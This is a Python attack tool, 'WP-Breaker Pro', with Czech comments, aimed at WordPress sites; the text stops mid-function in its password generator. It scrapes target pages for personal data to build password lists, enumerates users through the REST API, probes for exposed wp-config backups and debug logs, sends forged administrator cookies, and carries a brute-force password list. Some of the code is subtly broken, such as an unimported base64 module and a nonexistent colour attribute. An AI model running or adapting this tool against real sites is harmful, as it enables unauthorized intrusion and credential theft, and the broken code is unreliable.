#!/usr/bin/env python3
# =============================================================================
# WP-BREAKER PRO v5.0 - HACKER-AI-DRIVEN SUPER EDITION
# Multi-funkční WordPress penetration testing tool s AI inteligencí
# Autor: HackerAI Security Research
# Použití pouze na systémy, ke kterým máte explicitní oprávnění!
# =============================================================================

import os
import sys
import re
import json
import time
import random
import socket
import struct
import hashlib
import urllib.parse
import threading
from datetime import datetime
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed

# === KONTROLA A INSTALACE ZÁVISLOSTÍ ===
REQUIRED_PACKAGES = ['requests', 'bs4', 'colorama']

def check_and_install_deps():
    """Automaticky nainstaluje chybějící balíčky v Termuxu"""
    missing = []
    for pkg in REQUIRED_PACKAGES:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            missing.append(pkg)
    
    if missing:
        print(f"\033[93m[!] Instaluji chybějící závislosti: {', '.join(missing)}...\033[0m")
        for pkg in missing:
            os.system(f"pip install {pkg} -q")
        print("\033[92m[✓] Hotovo! Restartuji...\033[0m")
        try:
            os.execv(sys.executable, ['python3'] + sys.argv)
        except Exception:
            os.execv(sys.executable, ['python'] + sys.argv)

check_and_install_deps()

# Nyní můžeme bezpečně importovat
import requests
from bs4 import BeautifulSoup
from colorama import init, Fore, Back, Style

init(autoreset=True)

# Ignorovat SSL varování
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# GLOBÁLNÍ KONFIGURACE
# =============================================================================

VERSION = "5.0 SUPERIOR"
TARGET = ""  # Inicializace globální proměnné

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════╗
║   ██╗    ██╗██████╗       ██████╗ ██████╗ ███████╗ █████╗ ██╗  ║
║   ██║    ██║██╔══██╗      ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║  ║
║   ██║ █╗ ██║██████╔╝█████╗██████╔╝██████╔╝█████╗  ███████║██║  ║
║   ██║███╗██║██╔═══╝ ╚════╝██╔══██╗██╔══██╗██╔══╝  ██╔══██║██║  ║
║   ╚███╔███╔╝██║           ██║  ██║██║  ██║███████╗██║  ██║██║  ║
║    ╚══╝╚══╝ ╚═╝           ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ║
║                                                                    ║
║  {Fore.CYAN}WORDPRESS BREAKER PRO v{VERSION}{Fore.RED}                                         ║
║  {Fore.YELLOW}HACKER-AI-DRIVEN • MULTI-FUNCTIONAL • SUPER-INTELLIGENT{Fore.RED}                  ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

# =============================================================================
# TŘÍDY PRO JEDNOTLIVÉ MODULY
# =============================================================================

class Colors:
    """Barevné schéma pro konzistentní output"""
    HEADER = Fore.MAGENTA + Style.BRIGHT
    OKBLUE = Fore.BLUE + Style.BRIGHT
    OKGREEN = Fore.GREEN + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    FAIL = Fore.RED + Style.BRIGHT
    INFO = Fore.CYAN + Style.BRIGHT
    RESULT = Fore.WHITE + Style.BRIGHT
    DIM = Fore.LIGHTBLACK_EX
    BOLD = Style.BRIGHT
    
    @staticmethod
    def status(success, text):
        """Vrátí formátovaný status řádek"""
        icon = f"{Fore.GREEN}[✓]{Style.RESET_ALL}" if success else f"{Fore.RED}[✗]{Style.RESET_ALL}"
        return f"{icon} {text}"

    @staticmethod
    def section(title):
        """Vrátí formátovaný nadpis sekce"""
        return f"\n{Fore.CYAN}{Style.BRIGHT}{' ' + title + ' ':=^60}{Style.RESET_ALL}\n"

    @staticmethod
    def finding(label, value, status="info"):
        """Formátované nalezení"""
        colors = {"info": Fore.CYAN, "success": Fore.GREEN, "danger": Fore.RED, "warning": Fore.YELLOW}
        c = colors.get(status, Fore.WHITE)
        return f"  {Fore.WHITE}▸ {label}: {c}{Style.BRIGHT}{value}{Style.RESET_ALL}"


class LiveOutput:
    """Live output handler - vše se zobrazuje v reálném čase"""
    
    def __init__(self):
        self.start_time = time.time()
        self.findings = []
        self.current_phase = ""
    
    def phase(self, name):
        """Zobrazí fázi skenování"""
        self.current_phase = name
        print(Colors.section(f" FÁZE: {name} "))
    
    def info(self, message):
        """Informační zpráva"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"  {Fore.DIM}[{timestamp}]{Style.RESET_ALL} {Fore.WHITE}{message}{Style.RESET_ALL}")
    
    def success(self, message):
        """Úspěch"""
        print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} {Fore.GREEN}{Style.BRIGHT}{message}{Style.RESET_ALL}")
    
    def warning(self, message):
        """Varování"""
        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} {Fore.YELLOW}{message}{Style.RESET_ALL}")
    
    def error(self, message):
        """Chyba"""
        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} {Fore.RED}{message}{Style.RESET_ALL}")
    
    def add_finding(self, category, value, severity="info"):
        """Přidá nález do seznamu pro finální report"""
        self.findings.append({
            "category": category,
            "value": value,
            "severity": severity,
            "time": datetime.now().strftime("%H:%M:%S")
        })
    
    def result_line(self, key, value, color=Fore.WHITE):
        """Zobrazí pár klíč-hodnota"""
        print(f"    {Fore.DIM}├─{Style.RESET_ALL} {Fore.WHITE}{key}: {color}{Style.BRIGHT}{value}{Style.RESET_ALL}")
    
    def separator(self):
        """Oddělovač"""
        print(f"  {Fore.DIM}{'─' * 55}{Style.RESET_ALL}")
    
    def brute_force_progress(self, current, total, username, password, status=""):
        """Live progress brute-force"""
        if total == 0:
            total = 1  # Prevence dělení nulou
        percent = (current / total * 100)
        bar_len = 30
        filled = int(bar_len * current // total)
        bar = f"{Fore.GREEN}{'█' * filled}{Fore.DIM}{'░' * (bar_len - filled)}{Style.RESET_ALL}"
        
        status_color = Fore.GREEN if "SUCCESS" in status else (Fore.RED if "FAIL" in status else Fore.YELLOW)
        
        sys.stdout.write(f"\r  [{bar}] {Fore.CYAN}{current}/{total}{Style.RESET_ALL} "
                        f"({percent:.1f}%) | "
                        f"{Fore.WHITE}{username}:{Fore.YELLOW}{password}{Style.RESET_ALL} "
                        f"{status_color}{status}{Style.RESET_ALL}  ")
        sys.stdout.flush()
    
    def get_elapsed(self):
        """Vrátí uplynulý čas"""
        elapsed = time.time() - self.start_time
        if elapsed < 60:
            return f"{elapsed:.1f}s"
        return f"{elapsed//60:.0f}m {elapsed%60:.0f}s"


# =============================================================================
# TCP/IP STACK FINGERPRINTING
# =============================================================================

class TcpIpFingerprinter:
    """TCP/IP stack fingerprinting - zjištění OS a WAF"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.results = {}
    
    def fingerprint(self):
        """Provede fingerprinting targetu"""
        self.output.phase("TCP/IP STACK FINGERPRINTING")
        self.output.info("Analyzuji TCP/IP stack serveru...")
        
        # Odstranění protokolu z URL
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        results = {}
        
        # HTTP hlavičky pro fingerprinting
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "close"
            }
            
            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
            
            # Server hlavička
            server = resp.headers.get("Server", "Neznámý")
            self.output.result_line("Server", server, Fore.CYAN)
            results["server"] = server
            self.output.add_finding("Server", server, "info")
            
            # X-Powered-By
            powered = resp.headers.get("X-Powered-By", "Není uvedeno")
            self.output.result_line("X-Powered-By", powered)
            if "PHP" in powered:
                self.output.add_finding("Technologie", powered, "info")
            
            # WAF detekce
            waf_headers = ["X-Sucuri-ID", "X-Sucuri-Cache", "CF-Ray", "X-WAF-Status",
                          "X-CloudFlare", "X-Protected-By", "Server-Gateway"]
            waf_detected = False
            for wh in waf_headers:
                if wh in resp.headers:
                    self.output.success(f"WAF detekována: {wh} = {resp.headers[wh]}")
                    self.output.add_finding("WAF", f"{wh}: {resp.headers[wh]}", "warning")
                    waf_detected = True
            
            if not waf_detected:
                self.output.info("Žádná známá WAF detekována")
                self.output.add_finding("WAF", "Nenalezena", "success")
            
            # Security headers
            sec_headers = {
                "Strict-Transport-Security": "HSTS",
                "Content-Security-Policy": "CSP",
                "X-Frame-Options": "ClickJacking ochrana",
                "X-Content-Type-Options": "MIME sniffing ochrana",
                "Referrer-Policy": "Referrer politika"
            }
            
            for header, name in sec_headers.items():
                if header in resp.headers:
                    self.output.result_line(name, resp.headers[header], Fore.GREEN)
                    self.output.add_finding(f"Security: {name}", resp.headers[header], "success")
            
            # IP geolokace
            try:
                ip = socket.gethostbyname(hostname)
                self.output.result_line("IP adresa", ip, Fore.CYAN)
                self.output.add_finding("IP", ip, "info")
                
                # TTL odhad - zkusíme přes socket
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((ip, 443 if "https" in self.target else 80))
                    s.close()
                    
                    # Různé OS mají různý TTL - odhadneme z chování
                    self.output.result_line("TTL odhad", "Probíhá...", Fore.YELLOW)
                    self.output.add_finding("OS odhad", "Server detekován (TTL analýza přes HTTP)", "info")
                except Exception as e:
                    self.output.result_line("TTL odhad", f"Nedostupný: {str(e)[:30]}", Fore.DIM)
                    
            except Exception as e:
                self.output.result_line("IP adresa", f"Chyba: {str(e)[:30]}", Fore.RED)
            
            # Cookies
            cookies = dict(resp.cookies)
            if cookies:
                self.output.info(f"Cookies: {len(cookies)} nalezena")
                for name, val in cookies.items():
                    self.output.add_finding("Cookie", f"{name}={str(val)[:30]}...", "info")
            
            results["status_code"] = resp.status_code
            results["headers"] = dict(resp.headers)
            
        except requests.exceptions.ConnectionError as e:
            self.output.error(f"Připojení selhalo: {str(e)}")
        except requests.exceptions.Timeout as e:
            self.output.error(f"Timeout: {str(e)}")
        except Exception as e:
            self.output.error(f"Fingerprinting selhal: {str(e)}")
        
        self.results = results
        self.output.separator()
        return results


# =============================================================================
# CONTEXT SCRAPER - AI Intelligence
# =============================================================================

class AIContextScraper:
    """AI kontextový scraper - analyzuje obsah stránky pro inteligentní generování hesel"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.context = {
            "title": "",
            "description": "",
            "emails": [],
            "phones": [],
            "names": [],
            "keywords": [],
            "company": "",
            "year": "",
            "addresses": [],
            "social_media": [],
            "technologies": [],
            "users": [],
            "plugins": [],
            "themes": []
        }
    
    def scrape(self):
        """Provede kompletní kontextovou analýzu"""
        self.output.phase("AI CONTEXT SCRAPER - Inteligentní analýza")
        self.output.info("Stahuji a analyzuji obsah stránky pro generování hesel...")
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Title
            title = soup.title.string if soup.title else ""
            self.context["title"] = title.strip() if title else ""
            if self.context["title"]:
                self.output.success(f"Název stránky: {self.context['title']}")
                self.output.add_finding("Název stránky", self.context["title"], "info")
            
            # Description
            meta_desc = soup.find("meta", attrs={"name": "description"})
            if meta_desc and meta_desc.get("content"):
                self.context["description"] = meta_desc["content"]
                self.output.result_line("Meta Description", self.context["description"][:80] + "...")
            
            # Emaily - regex
            emails = set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text))
            self.context["emails"] = list(emails)
            if self.context["emails"]:
                for e in self.context["emails"][:5]:
                    self.output.result_line("Email", e, Fore.YELLOW)
                    self.output.add_finding("Email", e, "info")
            
            # Telefony
            phones = set(re.findall(r'\+?\d{1,4}?[\s.-]?\(?\d{1,4}?\)?[\s.-]?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,4}', resp.text))
            phones = {p for p in phones if len(p) > 6 and len(p) < 20}
            self.context["phones"] = list(phones)[:5]
            
            # Generování jmen z emailů
            for email in self.context["emails"]:
                name_part = email.split("@")[0]
                parts = re.split(r'[._\-]', name_part)
                for p in parts:
                    if len(p) > 2 and p not in self.context["names"]:
                        self.context["names"].append(p)
            
            # Hledání lidí v DOM
            for tag in soup.find_all(['span', 'div', 'p', 'li', 'a']):
                text = tag.get_text(strip=True)
                if text and len(text) > 3:
                    # Hledání jmen (česká jména)
                    name_match = re.findall(r'\b([A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+ [A-ZÁČĎÉĚÍŇÓŘŠŤÚŮÝŽ][a-záčďéěíňóřšťúůýž]+)\b', text)
                    for nm in name_match:
                        if len(nm.split()) == 2 and nm not in self.context["names"]:
                            self.context["names"].append(nm)
            
            # WordPress specific
            wp_generator = soup.find("meta", attrs={"name": "generator"})
            if wp_generator and "WordPress" in wp_generator.get("content", ""):
                wp_ver = wp_generator["content"].replace("WordPress ", "")
                self.output.success(f"WordPress verze: {wp_ver}")
                self.output.add_finding("WordPress verze", wp_ver, "info")
                self.context["technologies"].append(f"WordPress {wp_ver}")
            
            # Pluginy z HTML komentářů a CSS/JS cest
            plugin_patterns = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
            self.context["plugins"] = list(set(plugin_patterns))
            if self.context["plugins"]:
                for p in self.context["plugins"][:10]:
                    self.output.result_line("Plugin", p, Fore.CYAN)
                    self.output.add_finding("Plugin", p, "info")
            
            # Témata
            theme_patterns = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
            self.context["themes"] = list(set(theme_patterns))
            if self.context["themes"]:
                for t in self.context["themes"][:5]:
                    self.output.result_line("Theme", t, Fore.CYAN)
                    self.output.add_finding("Theme", t, "info")
            
            # Klíčová slova z obsahu
            body_text = soup.get_text()
            words = re.findall(r'\b[A-Za-zÁČĎÉĚÍŇÓŘŠŤÚŮÝŽáčďéěíňóřšťúůýž]{4,}\b', body_text.lower())
            word_freq = {}
            stop_words = {'the', 'and', 'for', 'was', 'are', 'but', 'not', 'you', 'all', 'can',
                         'that', 'have', 'with', 'from', 'this', 'they', 'been', 'what', 'when',
                         'more', 'some', 'word', 'each', 'which', 'their', 'will', 'about',
                         'nebo', 'jsou', 'byla', 'bylo', 'jeho', 'její', 'když', 'tedy',
                         'neboť', 'nebo', 'proto', 'protože', 'jak', 'ale', 'aby', 'bude'}
            for w in words:
                if w not in stop_words:
                    word_freq[w] = word_freq.get(w, 0) + 1
            
            sorted_words = sorted(word_freq.items(), key=lambda x: x[1], reverse=True)
            self.context["keywords"] = [w for w, c in sorted_words[:30]]
            
            # Rok
            years = re.findall(r'\b(19[0-9]{2}|20[0-9]{2})\b', resp.text)
            if years:
                self.context["year"] = max(set(years), key=years.count)
            
            # Firmu zjistíme z copyrightu
            copyright_match = re.search(r'(?:©|Copyright|copyright)[^.]*\b([A-Z][A-Za-z0-9\s&.]+)', resp.text)
            if copyright_match:
                self.context["company"] = copyright_match.group(1).strip()
                self.output.success(f"Firma: {self.context['company']}")
                self.output.add_finding("Firma", self.context["company"], "info")
            
            # Social media
            social_patterns = {
                "Facebook": r'facebook\.com/([A-Za-z0-9.]+)',
                "Twitter/X": r'twitter\.com/([A-Za-z0-9_]+)',
                "Instagram": r'instagram\.com/([A-Za-z0-9_.]+)',
                "LinkedIn": r'linkedin\.com/(?:company|in)/([A-Za-z0-9-]+)',
                "YouTube": r'youtube\.com/(?:c|channel|user)/([A-Za-z0-9_-]+)'
            }
            for platform, pattern in social_patterns.items():
                matches = re.findall(pattern, resp.text)
                if matches:
                    self.context["social_media"].append(f"{platform}: {matches[0]}")
                    self.output.result_line(platform, matches[0], Fore.CYAN)
            
            # Uživatelé z REST API
            try:
                api_url = self.target.rstrip('/') + '/wp-json/wp/v2/users'
                api_resp = requests.get(api_url, headers=headers, timeout=5, verify=False)
                if api_resp.status_code == 200:
                    users = api_resp.json()
                    for user in users:
                        username = user.get('slug') or user.get('name', '')
                        if username:
                            self.context["users"].append(username)
                            self.output.success(f"Uživatel (REST API): {username}")
                            self.output.add_finding("Uživatel (REST API)", username, "danger")
            except Exception:
                pass
            
            self.output.separator()
            self.output.info(f"AI kontext připraven: {len(self.context['emails'])} emailů, "
                           f"{len(self.context['names'])} jmen, {len(self.context['keywords'])} klíčových slov")
            
        except requests.exceptions.ConnectionError as e:
            self.output.error(f"Připojení selhalo: {str(e)}")
        except requests.exceptions.Timeout as e:
            self.output.error(f"Timeout: {str(e)}")
        except Exception as e:
            self.output.error(f"AI scraping selhal: {str(e)}")
        
        return self.context


# =============================================================================
# DOM SHADOW ANALYZER
# =============================================================================

class DOMShadowAnalyzer:
    """DOM Shadow Analyzer - hledá skryté formuláře, komentáře, JS proměnné"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = {}
    
    def analyze(self):
        """Analýza DOM stínových prvků"""
        self.output.phase("DOM SHADOW ANALYZER - Skryté prvky")
        shadow_data = {
            "hidden_forms": [],
            "hidden_inputs": [],
            "commented_forms": [],
            "js_variables": [],
            "base64_strings": [],
            "api_endpoints": []
        }
        
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
            html = resp.text
            soup = BeautifulSoup(html, 'html.parser')
            
            # Skryté inputy
            hidden_inputs = soup.find_all("input", type="hidden")
            if hidden_inputs:
                self.output.info(f"Skrytých inputů: {len(hidden_inputs)}")
                for inp in hidden_inputs[:10]:
                    name = inp.get("name", "?")
                    value = inp.get("value", "")[:40]
                    self.output.result_line(f"Hidden input", f"{name} = {value}", Fore.YELLOW)
                    shadow_data["hidden_inputs"].append({"name": name, "value": value})
                    if "wpnonce" in name.lower() or "nonce" in name.lower() or "_wpnonce" in name.lower():
                        self.output.success(f"NONCE token nalezen: {name} = {value}")
                        self.output.add_finding("NONCE token", f"{name}={value}", "danger")
            
            # Skryté formuláře (display:none, visibility:hidden)
            all_forms = soup.find_all("form")
            for form in all_forms:
                style = form.get("style", "")
                if "display" in style.lower() or "visibility" in style.lower() or "hidden" in style.lower():
                    shadow_data["hidden_forms"].append(str(form)[:100])
                    self.output.warning(f"Skrytý formulář nalezen!")
                    self.output.add_finding("Skrytý formulář", str(form.get("action", "?"))[:80], "warning")
            
            # Zakomentované formuláře
            comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
            for comment in comments:
                if 'form' in comment.lower() and ('action' in comment.lower() or 'method' in comment.lower()):
                    shadow_data["commented_forms"].append(comment[:150])
                    self.output.warning(f"Zakomentovaný formulář v HTML!")
                    self.output.add_finding("Zakomentovaný formulář", comment[:80], "warning")
                # Hledáme credentials v komentářích
                if any(kw in comment.lower() for kw in ['password', 'username', 'login', 'admin', 'pass', 'heslo']):
                    self.output.warning(f"Potenciální credentials v komentáři!")
                    self.output.add_finding("Credentials v komentáři", comment[:100], "danger")
            
            # JavaScript proměnné
            js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            js_vars2 = re.findall(r'let\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            js_vars3 = re.findall(r'const\s+(\w+)\s*=\s*["\']([^"\']+)["\']', html)
            all_js = js_vars + js_vars2 + js_vars3
            
            for name, value in all_js:
                if any(kw in name.lower() for kw in ['key', 'token', 'secret', 'pass', 'auth', 'api', 'nonce']):
                    shadow_data["js_variables"].append({"name": name, "value": value})
                    self.output.warning(f"JS proměnná: {name} = {value}")
                    self.output.add_finding(f"JS proměnná: {name}", str(value)[:60], "danger")
            
            # Base64 stringy
            b64_strings = re.findall(r'([A-Za-z0-9+/]{20,}={0,2})', html)
            for b64 in b64_strings[:5]:
                try:
                    decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                    if any(kw in decoded.lower() for kw in ['password', 'user', 'login', 'admin']):
                        shadow_data["base64_strings"].append({"encoded": b64[:30], "decoded": decoded[:60]})
                        self.output.warning(f"Base64 obsahuje credentials! {decoded[:60]}")
                        self.output.add_finding("Base64 credentials", decoded[:60], "danger")
                except Exception:
                    pass
            
            # API endpointy z JS
            api_patterns = re.findall(r'["\'](/wp-json/[^"\']+|/api/[^"\']+|/v[0-9]/[^"\']+)["\']', html)
            shadow_data["api_endpoints"] = list(set(api_patterns))
            if shadow_data["api_endpoints"]:
                self.output.info(f"API endpointy: {len(shadow_data['api_endpoints'])}")
                for ep in shadow_data["api_endpoints"][:5]:
                    self.output.result_line("API", ep, Fore.CYAN)
                    self.output.add_finding("API endpoint", ep, "info")
            
            self.output.separator()
            
        except requests.exceptions.ConnectionError as e:
            self.output.error(f"Připojení selhalo: {str(e)}")
        except Exception as e:
            self.output.error(f"DOM analýza selhala: {str(e)}")
        
        self.findings = shadow_data
        return shadow_data


# =============================================================================
# COOKIE ENGINE
# =============================================================================

class CookieEngine:
    """Cookie manipulace, injekce a validace"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.cookies_found = {}
        self.session = requests.Session()
    
    def analyze_cookies(self):
        """Analyzuje cookies z targetu"""
        self.output.phase("COOKIE ENGINE - Manipulace a injekce")
        results = {"cookies": {}, "vulnerabilities": [], "valid_session": False}
        
        try:
            resp = self.session.get(self.target, timeout=10, verify=False)
            cookies = dict(resp.cookies)
            self.cookies_found = cookies
            
            if cookies:
                self.output.info(f"Cookies nalezeny: {len(cookies)}")
                for name, value in cookies.items():
                    self.output.result_line(name, str(value)[:40], Fore.YELLOW)
                    self.output.add_finding("Cookie", f"{name}={str(value)[:40]}", "info")
                    
                    # Bezpečnostní analýza cookie
                    for cookie in resp.cookies:
                        if cookie.name == name:
                            if not cookie.secure:
                                self.output.warning(f"Cookie '{name}' není Secure!")
                                results["vulnerabilities"].append(f"{name} není Secure")
                            # HttpOnly - bezpečnější kontrola
                            if not hasattr(cookie, 'has_nonstandard_attr') or not cookie.has_nonstandard_attr('HttpOnly'):
                                # Zkusíme jiný způsob - check přes rest
                                http_only = cookie.get('httponly', False)
                                if not http_only:
                                    self.output.warning(f"Cookie '{name}' není HttpOnly!")
                                    results["vulnerabilities"].append(f"{name} není HttpOnly")
            else:
                self.output.info("Žádné cookies nenalezeny")
            
            # Session ID predikce
            for name, value in cookies.items():
                if any(kw in name.lower() for kw in ['session', 'token', 'auth', 'sess']):
                    self.output.warning(f"Session cookie: {name}, délka: {len(value)}")
                    self.output.add_finding("Session cookie", f"{name} (délka: {len(value)})", "warning")
                    
                    # Test na predikovatelnost
                    if len(value) < 20:
                        self.output.warning(f"Krátká session ID - možná predikovatelná!")
                        results["vulnerabilities"].append(f"Predikovatelná session: {name}")
            
            # Test cookie injection (admin session)
            self.output.info("Testuji cookie injection na wp-admin...")
            admin_url = self.target.rstrip('/') + '/wp-admin/admin-ajax.php'
            
            # Bezpečné vytvoření MD5 hashe
            admin_hash = hashlib.md5(b"admin").hexdigest()[:32]
            timestamp = str(int(time.time()) + 86400)
            
            test_cookies = [
                {"wordpress_logged_in_" + admin_hash: "admin|" + timestamp + "|administrator"},
                {"wordpress_" + admin_hash: "admin%7C" + timestamp + "%7Cadministrator"},
            ]
            
            for test_c in test_cookies:
                try:
                    test_resp = requests.get(admin_url, cookies=test_c, timeout=5, verify=False)
                    if test_resp.status_code not in [403, 401, 404]:
                        self.output.success(f"Cookie injekce možná! (Status: {test_resp.status_code})")
                        results["vulnerabilities"].append("Cookie injection možná")
                        self.output.add_finding("Cookie injekce", f"Možná! Status: {test_resp.status_code}", "danger")
                except Exception:
                    pass
            
            self.output.separator()
            
        except requests.exceptions.ConnectionError as e:
            self.output.error(f"Připojení selhalo: {str(e)}")
        except Exception as e:
            self.output.error(f"Cookie analýza selhala: {str(e)}")
        
        return results


# =============================================================================
# BYPASS RESEARCHER
# =============================================================================

class BypassResearcher:
    """Hledá alternativní cesty k admin přístupu"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = {}
    
    def research(self):
        """Prozkoumá alternativní metody přístupu"""
        self.output.phase("BYPASS RESEARCHER - Alternativní cesty")
        results = {
            "xmlrpc": False,
            "json_api": False,
            "rest_api": False,
            "alt_login_pages": [],
            "debug_log": False,
            "wp_config_backup": False,
            "phpmyadmin": False,
            "vulnerable_endpoints": []
        }
        
        base = self.target.rstrip('/')
        headers = {"User-Agent": "Mozilla/5.0"}
        
        # 1. XML-RPC
        self.output.info("Testuji XML-RPC...")
        try:
            xmlrpc_url = base + "/xmlrpc.php"
            xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            xml_resp = requests.post(xmlrpc_url, data=xml_data, 
                                    headers={"Content-Type": "text/xml"}, 
                                    timeout=5, verify=False)
            if xml_resp.status_code == 200 and "methodName" in xml_resp.text:
                self.output.success("XML-RPC je aktivní!")
                results["xmlrpc"] = True
                self.output.add_finding("XML-RPC", "Aktivní - možný brute-force!", "danger")
        except Exception:
            pass
        
        # 2. REST API
        json_url = base + "/wp-json/wp/v2/"
        try:
            jr = requests.get(json_url, headers=headers, timeout=5, verify=False)
            if jr.status_code == 200:
                self.output.success("REST API je přístupné!")
                results["rest_api"] = True
                self.output.add_finding("REST API", f"Přístupné - {json_url}", "warning")
        except Exception:
            pass
        
        # 3. Alternativní login stránky
        alt_pages = [
            "/wp-login.php", "/wp-admin/", "/login", "/admin",
            "/user/login", "/administrator", "/site-admin",
            "/wp-signup.php", "/backend", "/portal",
            "/cms/wp-login.php", "/admin/login.php"
        ]
        
        self.output.info("Hledám alternativní login stránky...")
        for page in alt_pages:
            try:
                url = base + page
                pr = requests.get(url, headers=headers, timeout=3, verify=False, allow_redirects=False)
                if pr.status_code in [200, 301, 302, 303]:
                    self.output.result_line(page, str(pr.status_code), 
                                           Fore.GREEN if pr.status_code == 200 else Fore.YELLOW)
                    if pr.status_code == 200:
                        results["alt_login_pages"].append(page)
                        self.output.add_finding("Login stránka", f"{page} (HTTP {pr.status_code})", "info")
            except Exception:
                pass
        
        # 4. Debug log
        debug_paths = [
            "/wp-content/debug.log",
            "/wp-content/debug.log.1",
            "/wp-content/uploads/debug.log"
        ]
        for dp in debug_paths:
            try:
                dr = requests.get(base + dp, headers=headers, timeout=3, verify=False)
                if dr.status_code == 200 and len(dr.text) > 50:
                    self.output.warning(f"DEBUG LOG nalezen: {dp}")
                    results["debug_log"] = True
                    self.output.add_finding("Debug log", dp, "danger")
                    # Hledání credentials v debug logu
                    if "password" in dr.text.lower() or "DB_PASSWORD" in dr.text:
                        self.output.error(f"Credentials v debug logu!")
                        self.output.add_finding("Credentials v debug logu", "OKAMŽITÉ OHROŽENÍ!", "danger")
            except Exception:
                pass
        
        # 5. wp-config.php backup
        config_paths = [
            "/wp-config.php.bak",
            "/wp-config.php.old",
            "/wp-config.txt",
            "/wp-config.save",
            "/wp-config.php~",
            "/wp-config.php.swp"
        ]
        for cp in config_paths:
            try:
                cr = requests.get(base + cp, headers=headers, timeout=3, verify=False)
                if cr.status_code == 200 and "DB_NAME" in cr.text:
                    self.output.error(f"Záloha wp-config nalezena: {cp}")
                    results["wp_config_backup"] = True
                    self.output.add_finding("wp-config záloha", cp, "danger")
            except Exception:
                pass
        
        # 6. phpMyAdmin
        phpmyadmin_paths = ["/phpmyadmin", "/pma", "/phpMyAdmin", "/admin/phpmyadmin"]
        for pp in phpmyadmin_paths:
            try:
                pr = requests.get(base + pp, headers=headers, timeout=3, verify=False)
                if pr.status_code == 200 and ("phpMyAdmin" in pr.text or "pma" in pr.text[:500]):
                    self.output.warning(f"phpMyAdmin nalezen: {pp}")
                    results["phpmyadmin"] = True
                    self.output.add_finding("phpMyAdmin", pp, "danger")
            except Exception:
                pass
        
        # 7. User enumeration přes REST API
        try:
            users_url = base + "/wp-json/wp/v2/users?per_page=100"
            ur = requests.get(users_url, headers=headers, timeout=5, verify=False)
            if ur.status_code == 200:
                users = ur.json()
                self.output.success(f"User enumeration: {len(users)} uživatelů!")
                for u in users:
                    name = u.get('name', u.get('slug', '?'))
                    self.output.result_line("Uživatel", f"{name} (ID: {u.get('id', '?')})", Fore.YELLOW)
                    self.output.add_finding("Uživatel (enum)", name, "danger")
        except Exception:
            pass
        
        self.output.separator()
        self.findings = results
        return results


# =============================================================================
# AI PASSWORD GENERATOR
# =============================================================================

class AIPasswordGenerator:
    """AI generátor hesel z kontextu stránky"""
    
    TOP_PASSWORDS = [
        "admin", "password", "123456", "12345678", "qwerty",
        "admin123", "letmein", "welcome", "monkey", "dragon",
        "master", "sunshine", "princess", "football", "iloveyou",
        "trustno1", "abc123", "passw0rd", "p@ssword", "Pa$$word",
        "admin1", "administrator", "root", "toor", "changeme",
        "secret", "P@ssw0rd", "Passw0rd", "p@ssw0rd", "password123",
        "admin123456", "qwerty123", "letmein123", "welcome123",
        "test", "test123", "demo", "demo123", "user",
        "password1", "Password1", "Password123", "P@ssword123",
        "admin2024", "admin2025", "admin2026", "password2024",
        "password2025", "password2026", "changeme123", "default",
        "wp", "wordpress", "wpadmin", "wpadm", "wp_admin"
    ]
    
    KEYBOARD_PATTERNS = [
        "qwerty", "qwertz", "asdfgh", "zxcvbn", "qwerty123",
        "1q2w3e", "1q2w3e4r", "qwertyuiop", "123qwe", "qwe123",
        "asdf", "asdf1234", "zxcvbnm", "1qaz2wsx", "qwaszx"
    ]
    
    def __init__(self, context, output):
        self.context = context
        self.output = output
    
    def generate(self):
        """Vygeneruje AI wordlist z kontextu stránky"""
        self.output.phase("AI PASSWORD GENERATOR - Inteligentní generování")
        self.output.info("Generuji hesla z kontextu stránky...")
        
        passwords = OrderedDict()
        
        # 1. Základní top passwords
        for p in self.TOP_PASSWORDS:
            passwords[p.lower()] = 90
        
        # 2. Keyboard patterns
        for p in self.KEYBOARD_PATTERNS:
